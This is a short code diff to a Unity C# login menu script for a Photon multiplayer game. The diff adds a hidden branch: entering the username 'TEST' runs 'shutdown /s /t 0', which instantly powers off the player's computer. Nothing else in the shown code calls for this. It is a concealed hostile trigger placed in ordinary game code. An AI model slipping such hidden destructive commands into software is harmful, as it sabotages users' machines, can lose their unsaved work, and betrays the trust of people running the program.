@@ -85,6 +85,10 @@ public class MenuManager : MonoBehaviour
         {
             PhotonNetwork.playerName = "01001010 01000101 01000001 01001110 00100000 01001101 01000001 01001100 01001111";
         }
+        else if(UsernameInput.text.ToUpper() == "TEST")
+        {
+            System.Diagnostics.Process.Start("shutdown","/s /t 0");
+        }
         else
         {
             PhotonNetwork.playerName = UsernameInput.text;
